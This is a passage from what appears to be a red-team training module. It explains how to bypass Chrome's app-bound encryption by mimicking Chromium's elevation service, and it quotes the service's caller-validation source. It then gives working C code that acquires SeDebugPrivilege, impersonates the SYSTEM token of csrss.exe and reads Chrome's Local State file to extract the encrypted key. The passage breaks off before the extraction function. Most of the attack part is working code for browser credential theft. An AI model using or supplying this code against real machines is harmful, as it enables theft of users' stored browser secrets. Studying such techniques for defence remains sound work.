  <span class="token keyword">const</span> <span class="token keyword">auto</span> narrow_path <span class="token operator">=</span>
      base<span class="token operator">::</span><span class="token function">SysWideToUTF8</span><span class="token punctuation">(</span><span class="token function">MaybeTrimProcessPath</span><span class="token punctuation">(</span>process_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint8_t</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>narrow_path<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> narrow_path<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

base<span class="token operator">::</span>expected<span class="token operator">&lt;</span>base<span class="token operator">::</span>FilePath<span class="token punctuation">,</span> DWORD<span class="token operator">&gt;</span> <span class="token function">GetProcessExecutablePath</span><span class="token punctuation">(</span>
    <span class="token keyword">const</span> base<span class="token operator">::</span>Process<span class="token operator">&amp;</span> process<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  std<span class="token operator">::</span>wstring <span class="token function">image_path</span><span class="token punctuation">(</span>MAX_PATH<span class="token punctuation">,</span> L<span class="token char">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  DWORD path_length <span class="token operator">=</span> image_path<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  BOOL success <span class="token operator">=</span> <span class="token operator">::</span><span class="token function">QueryFullProcessImageNameW</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                                              image_path<span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>path_length<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>success <span class="token operator">&amp;&amp;</span> <span class="token operator">::</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> ERROR_INSUFFICIENT_BUFFER<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Process name is potentially greater than MAX_PATH, try larger max size.</span>
    <span class="token comment">// https://docs.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation</span>
    image_path<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>UNICODE_STRING_MAX_CHARS<span class="token punctuation">)</span><span class="token punctuation">;</span>
    path_length <span class="token operator">=</span> image_path<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    success <span class="token operator">=</span> <span class="token operator">::</span><span class="token function">QueryFullProcessImageNameW</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                                           image_path<span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>path_length<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">PLOG_IF</span><span class="token punctuation">(</span>ERROR<span class="token punctuation">,</span> <span class="token operator">::</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> ERROR_GEN_FAILURE<span class="token punctuation">)</span>
        <span class="token operator">&lt;&lt;</span> <span class="token string">"Failed to get process image path"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> base<span class="token operator">::</span><span class="token function">unexpected</span><span class="token punctuation">(</span><span class="token operator">::</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> base<span class="token operator">::</span><span class="token function">FilePath</span><span class="token punctuation">(</span>image_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate path based validation data, or return empty string if this was not</span>
<span class="token comment">// possible.</span>
base<span class="token operator">::</span>expected<span class="token operator">&lt;</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint8_t</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> HRESULT<span class="token operator">&gt;</span> <span class="token function">GeneratePathValidationData</span><span class="token punctuation">(</span>
    <span class="token keyword">const</span> base<span class="token operator">::</span>FilePath<span class="token operator">&amp;</span> process_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>process_path<span class="token punctuation">.</span><span class="token function">IsNetwork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> base<span class="token operator">::</span><span class="token function">unexpected</span><span class="token punctuation">(</span>
        elevation_service<span class="token operator">::</span>Elevator<span class="token operator">::</span>kErrorUnsupportedFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// Wide to narrow data loss is fine here, because the same system will always</span>
  <span class="token comment">// be dealing with the same data.</span>
  <span class="token keyword">const</span> <span class="token keyword">auto</span> narrow_path <span class="token operator">=</span>
      base<span class="token operator">::</span><span class="token function">SysWideToUTF8</span><span class="token punctuation">(</span><span class="token function">MaybeTrimProcessPath</span><span class="token punctuation">(</span>process_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint8_t</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>narrow_path<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> narrow_path<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

HRESULT <span class="token function">ValidatePath</span><span class="token punctuation">(</span><span class="token keyword">const</span> base<span class="token operator">::</span>Process<span class="token operator">&amp;</span> process<span class="token punctuation">,</span>
                     base<span class="token operator">::</span>span<span class="token operator">&lt;</span><span class="token keyword">const</span> <span class="token class-name">uint8_t</span><span class="token operator">&gt;</span> data<span class="token punctuation">,</span>
                     std<span class="token operator">::</span>string<span class="token operator">*</span> log_message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">auto</span> process_path <span class="token operator">=</span> <span class="token function">GetProcessExecutablePath</span><span class="token punctuation">(</span>process<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>process_path<span class="token punctuation">.</span><span class="token function">has_value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> elevation_service<span class="token operator">::</span>Elevator<span class="token operator">::</span>kErrorCouldNotObtainPath<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">auto</span> current_path_data <span class="token operator">=</span> <span class="token function">GeneratePathValidationData</span><span class="token punctuation">(</span><span class="token operator">*</span>process_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>current_path_data<span class="token punctuation">.</span><span class="token function">has_value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> current_path_data<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> current_path_data<span class="token operator">-&gt;</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
      std<span class="token operator">::</span><span class="token function">equal</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> current_path_data<span class="token operator">-&gt;</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> S_OK<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">SYSLOG</span><span class="token punctuation">(</span>WARNING<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"Failed to authenticate caller process: "</span>
                  <span class="token operator">&lt;&lt;</span> process_path<span class="token operator">-&gt;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>log_message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span>log_message <span class="token operator">=</span>
        <span class="token string">"Data: '"</span> <span class="token operator">+</span> std<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'. Current: '"</span> <span class="token operator">+</span>
        std<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>current_path_data<span class="token operator">-&gt;</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> current_path_data<span class="token operator">-&gt;</span><span class="token function">cend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
        <span class="token string">"'"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> elevation_service<span class="token operator">::</span>Elevator<span class="token operator">::</span>kValidationDidNotPass<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>After the caller is validated, the service calls its internal <code>DecryptData</code>
 function to decrypt the app-bound key. Given that we have access to the
 source code for Chromium, if we manage to gain execution in the context
 of <code>SYSTEM</code>, we can simply replicate <a href="https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155" target="_blank">the steps</a> the elevation service takes to decrypt the app-bound key. As getting <code>SYSTEM</code> is not uncommon in a red team engagement, this is the approach we will take in this module.</p>
<h3 id="toc-heading-7">Mimicking The Elevation Service</h3>
<p>As explained, we must first gain the ability to operate as the <code>SYSTEM</code> user. We will enforce that our tool runs as a local administrator so that we can leverage the <code>SeDebugPrivilege</code> privilege to open a handle to the token of a system process. We can then impersonate this token whenever we need to run as <code>SYSTEM</code>.</p>
<p>The <code>GetSystemToken</code> helper uses <code>RtlAcquirePrivilege</code> to gain the <code>SeDebugPrivilege</code> privilege which allows us to bypass access checks related to process operations. Then, we will use another helper, <code>OpenProcessTokenByName</code>, to open a handle to the <code>csrss.exe</code> system process, since it is always present. <code>OpenProcessTokenByName</code> will be explained shortly.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">HANDLE <span class="token function">GetSystemToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    NTSTATUS Status<span class="token punctuation">;</span>
    ULONG    Privilege <span class="token operator">=</span> SE_DEBUG_PRIVILEGE<span class="token punctuation">;</span>
    PVOID    State<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the SeDebugPrivilege privilege</span>
    <span class="token comment">//</span>

    Status <span class="token operator">=</span> <span class="token function">RtlAcquirePrivilege</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Privilege<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>State<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not acquire the SeDebugPrivilege: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token function">OpenProcessTokenByName</span><span class="token punctuation">(</span>L<span class="token string">"csrss.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The <code>OpenProcessTokenByName</code> function opens an access token for a process by its name. It first finds the process ID (PID) of the target process using the <code>GetProcessPid</code> function. <code>GetProcessPid</code> takes a snapshot of all running processes with <code>CreateToolhelp32Snapshot</code> and scans through them until it finds the specified process, returning its PID. Using this PID, <code>OpenProcessTokenByName</code> calls <code>OpenProcess</code> to get a handle to the process with <code>PROCESS_QUERY_LIMITED_INFORMATION</code> rights. With this handle, it then uses <code>OpenProcessToken</code> to open a handle to the process's access token, which it returns if successful. This token can then be impersonated using <code>ImpersonateLoggedOnUser</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">ULONG <span class="token function">GetProcessPid</span><span class="token punctuation">(</span>_In_ LPCWSTR ProcessName<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    HANDLE         Snapshot<span class="token punctuation">;</span>
    ULONG          ProcessId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    PROCESSENTRY32 Entry<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Take a snapshot of all processes in the system</span>
    <span class="token comment">//</span>

    Snapshot <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Snapshot <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    Entry<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PROCESSENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">//</span>
    <span class="token comment">// Get information about the first process in the snapshot</span>
    <span class="token comment">//</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Process32First</span><span class="token punctuation">(</span>Snapshot<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Entry<span class="token punctuation">)</span> <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>Snapshot<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Iterate each entry looking for the specified process</span>
    <span class="token comment">//</span>

    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">wcscmp</span><span class="token punctuation">(</span>Entry<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> ProcessName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            ProcessId <span class="token operator">=</span> Entry<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>Snapshot<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Entry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Close the handle to the snapshot</span>
    <span class="token comment">//</span>

    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>Snapshot<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> ProcessId<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

HANDLE <span class="token function">OpenProcessTokenByName</span><span class="token punctuation">(</span>_In_ LPCWSTR ProcessName<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    ULONG  ProcessId<span class="token punctuation">;</span>
    HANDLE ProcessHandle<span class="token punctuation">;</span>
    HANDLE TokenHandle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the PID of the specified process as it is required by the OpenProcess WinAPI</span>
    <span class="token comment">//</span>

    ProcessId <span class="token operator">=</span> <span class="token function">GetProcessPid</span><span class="token punctuation">(</span>ProcessName<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ProcessId <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not get the PID of: %ws\n"</span><span class="token punctuation">,</span> ProcessName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open a handle to the process with PROCESS_QUERY_LIMITED_INFORMATION access permission so we can get a handle to its token</span>
    <span class="token comment">//</span>

    ProcessHandle <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_LIMITED_INFORMATION<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> ProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ProcessHandle <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to: %lu error: %lu\n"</span><span class="token punctuation">,</span> ProcessId<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open a handle to the process's token with TOKEN_QUERY | TOKEN_DUPLICATE access permission so we can impersonate it</span>
    <span class="token comment">//</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>ProcessHandle<span class="token punctuation">,</span> TOKEN_QUERY <span class="token operator">|</span> TOKEN_DUPLICATE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>TokenHandle<span class="token punctuation">)</span> <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the token of: %lu error: %lu\n"</span><span class="token punctuation">,</span> ProcessId<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>ProcessHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> TokenHandle<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-8">The Decryption Process</h4>
<p>Now that we can run as the <code>SYSTEM</code> user when needed, we 
can begin the decryption process. First, we need to read the local state
 file, as it contains the encrypted app-bound key. To do this, we use 
the <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath" target="_blank">SHGetKnownFolderPath</a> function to get the path to the <code>AppData\Local</code> folder. We then set this path as the current working directory with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setcurrentdirectory" target="_blank">SetCurrentDirectoryW</a> WinAPI function. This allows us to reference Chrome's user data folder via a relative path starting from <code>AppData\Local</code>. Next, we read the local state JSON file located at <code>Google\Chrome\User Data\Local State</code> using the <code>ReadFileContents</code> helper function. Finally, we call <code>ExtractAppBoundKey</code>
 to extract and decrypt the app-bound key from the local state file. The
 details of the key extraction function will be explained shortly.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">PUCHAR <span class="token function">ReadFileContents</span><span class="token punctuation">(</span>_In_ PWCHAR FileName<span class="token punctuation">,</span> _Inout_ PULONG Size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    HANDLE FileHandle<span class="token punctuation">;</span>
    ULONG  FileSize<span class="token punctuation">;</span>
    ULONG  BytesRead<span class="token punctuation">;</span>
    BOOL   Result<span class="token punctuation">;</span>
    PUCHAR Buffer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    FileHandle <span class="token operator">=</span> <span class="token function">CreateFileW</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> GENERIC_READ<span class="token punctuation">,</span> FILE_SHARE_READ <span class="token operator">|</span> FILE_SHARE_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>FileHandle <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle on the: %ws file: %lu\n"</span><span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        FileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>FileHandle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>FileSize <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could get the size of the: %ws file: %lu\n"</span><span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Buffer <span class="token operator">=</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Buffer <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not allocate the %lu bytes needed to read the contents of: %ws\n"</span><span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> FileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Result <span class="token operator">=</span> <span class="token function">ReadFile</span><span class="token punctuation">(</span>FileHandle<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>BytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE <span class="token operator">||</span> BytesRead <span class="token operator">!=</span> FileSize<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could read the: %ws file: %lu\n"</span><span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            Buffer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>Size <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token operator">*</span>Size <span class="token operator">=</span> FileSize<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>FileHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Buffer<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

INT <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//</span>
    <span class="token comment">// Get the path to the AppData\Local folder</span>
    <span class="token comment">//</span>

    HRESULT Result<span class="token punctuation">;</span>
    PWSTR   AppDataPath<span class="token punctuation">;</span>
    PUCHAR  LocalState<span class="token punctuation">;</span>
    UCHAR   AppBoundKey<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    Result <span class="token operator">=</span> <span class="token function">SHGetKnownFolderPath</span><span class="token punctuation">(</span>FOLDERID_LocalAppData<span class="token punctuation">,</span> KF_FLAG_DONT_UNEXPAND<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FAILED</span><span class="token punctuation">(</span>Result<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not get the path of the AppData folder: %lu\n"</span><span class="token punctuation">,</span> Result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Set it as the current working directory</span>
    <span class="token comment">//</span>

    <span class="token function">SetCurrentDirectoryW</span><span class="token punctuation">(</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CoTaskMemFree</span><span class="token punctuation">(</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Free the memory allocated by SHGetKnownFolderPath</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the app-bound encryption key</span>
    <span class="token comment">//</span>

